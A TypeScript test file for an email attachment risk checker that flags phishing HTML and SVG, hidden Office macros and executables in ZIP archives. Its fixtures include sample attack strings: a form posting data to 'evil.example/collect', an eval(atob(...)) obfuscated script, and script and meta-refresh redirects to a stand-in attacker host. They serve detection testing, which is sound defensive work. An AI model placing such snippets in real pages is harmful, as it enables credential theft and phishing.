import { describe, expect, it } from "vitest";
import { attachmentRisk, zipEntryNames } from "../src/index.ts";

/** A minimal ZIP with stored (uncompressed) entries: enough for local headers, which is all the inspector reads. */
function zip(entries: Record<string, string>, flags = 0): Buffer {
  const parts: Buffer[] = [];
  for (const [name, body] of Object.entries(entries)) {
    const n = Buffer.from(name), b = Buffer.from(body);
    const h = Buffer.alloc(30);
    h.writeUInt32LE(0x04034b50, 0); h.writeUInt16LE(20, 4); h.writeUInt16LE(flags, 6); h.writeUInt32LE(b.length, 18); h.writeUInt32LE(b.length, 22);
    h.writeUInt16LE(n.length, 26);
    parts.push(h, n, b);
  }
  return Buffer.concat(parts);
}
const risk = (name: string, content: string | Buffer, mime = "application/octet-stream") => attachmentRisk(name, mime, Buffer.isBuffer(content) ? content : Buffer.from(content));

describe("zipEntryNames", () => {
  it("lists entry names and caps the count", () => {
    expect(zipEntryNames(zip({ "a.txt": "x", "dir/b.exe": "y" }))).toEqual(["a.txt", "dir/b.exe"]);
    const many = zip(Object.fromEntries(Array.from({ length: 800 }, (_, i) => [`f${i}.txt`, "x"])));
    expect(zipEntryNames(many).length).toBeLessThanOrEqual(500);
  });
  it("returns nothing for non-zip data", () => expect(zipEntryNames(Buffer.from("hello"))).toEqual([]));
});

describe("HTML attachments are judged by what they do, not by their extension", () => {
  it("a plain HTML receipt is not risky", () => {
    expect(risk("receipt.html", "<html><body><h1>Receipt</h1><p>Total $12</p><a href='https://shop.example/orders/1'>View order</a></body></html>")).toBeUndefined();
    expect(risk("page.htm", "<p>hello</p><form action='/local'><input name=q></form>")).toBeUndefined();
  });
  it("flags a credential form, a form that posts to another site, obfuscated script, and scripted redirects", () => {
    expect(risk("login.html", "<form><input type=\"password\" name=p></form>")).toMatch(/password/i);
    expect(risk("a.html", "<form action=\"https://evil.example/collect\" method=post><input name=u></form>")).toMatch(/outside|another/i);
    expect(risk("b.html", "<script>document.write(unescape('%3Cscript%3E'));eval(atob('YWxlcnQoMSk='))</script>")).toMatch(/obfuscat/i);
    expect(risk("c.html", "<script>window.location.href = 'https://evil.example/x'</script>")).toMatch(/redirect/i);
    expect(risk("d.htm", "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">")).toMatch(/redirect/i);
  });
  it("also inspects SVG files, which can carry script", () => {
    expect(risk("x.svg", "<svg xmlns='http://www.w3.org/2000/svg'><script>location='https://evil.example'</script></svg>")).toMatch(/redirect/i);
    expect(risk("logo.svg", "<svg xmlns='http://www.w3.org/2000/svg'><circle r='5'/></svg>")).toBeUndefined();
  });
});

describe("Office files and archives", () => {
  it("flags macros hidden in a file that is not named as macro-enabled", () => {
    expect(risk("invoice.docx", zip({ "[Content_Types].xml": "x", "word/vbaProject.bin": "x" }))).toMatch(/macro/i);
    expect(risk("clean.docx", zip({ "[Content_Types].xml": "x", "word/document.xml": "x" }))).toBeUndefined();
  });
  it("flags an archive that contains something executable, even nested one folder deep", () => {
    expect(risk("docs.zip", zip({ "readme.txt": "x", "setup/invoice.exe": "x" }), "application/zip")).toMatch(/invoice\.exe/);
    expect(risk("docs.zip", zip({ "a.pdf": "x", "b.png": "x" }), "application/zip")).toBeUndefined();
    expect(risk("pack.zip", zip({ "scan.pdf.js": "x" }), "application/zip")).toMatch(/scan\.pdf\.js/);
  });
  it("leaves other files alone and never throws on garbage", () => {
    expect(risk("photo.jpg", Buffer.from([0xff, 0xd8, 0xff]))).toBeUndefined();
    expect(risk("broken.zip", Buffer.from("PK\u0003\u0004garbage"), "application/zip")).toBeUndefined();
  });
});
